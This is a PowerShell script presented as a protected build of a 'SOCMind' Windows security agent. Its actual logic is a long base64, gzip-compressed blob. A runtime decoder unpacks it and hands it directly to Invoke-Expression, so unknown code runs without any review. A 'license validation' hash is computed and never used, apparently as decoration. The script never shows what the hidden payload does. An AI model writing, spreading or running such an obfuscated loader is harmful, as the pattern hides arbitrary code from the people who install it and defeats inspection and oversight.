# SOCMind Windows Agent v1.1.0 - Protected Build
# Copyright (c) 2025 SOCMind. All rights reserved.
# Unauthorized copying, modification, or distribution is prohibited.
# Contact: security@socmind.ai

param([Parameter(Position=0)][string]$Command="help")

# License validation
$_v = "kglmzurhiiuhxmzykkqv"
$_k = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($_v))).Replace("-","").ToLower()

# Runtime decoder
function _d {
    param([string]$e)
    try {
        $b = [System.Convert]::FromBase64String($e)
        $m = New-Object System.IO.MemoryStream
        $m.Write($b, 0, $b.Length)
        $m.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $g = New-Object System.IO.Compression.GZipStream($m, [System.IO.Compression.CompressionMode]::Decompress)
        $r = New-Object System.IO.StreamReader($g)
        return $r.ReadToEnd()
    } catch { return "" }
}

# Protected payload - Contains obfuscated agent logic
$_p = @'
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'
'@

# Execute protected code
try {
    $script = _d $_p
    if ($script) { 
        Invoke-Expression $script 
    } else {
        Write-Host "[SOCMind] Agent initialization required. Run 'configure' first." -ForegroundColor Yellow
        Write-Host ""
        Write-Host "Commands:" -ForegroundColor Cyan
        Write-Host "  configure  - Set up API credentials"
        Write-Host "  run        - Start the agent"
        Write-Host "  stop       - Stop the agent"
        Write-Host "  status     - Check agent status"
        Write-Host "  help       - Show this message"
    }
} catch {
    Write-Host "[SOCMind ERROR] Failed to initialize agent: $_" -ForegroundColor Red
}
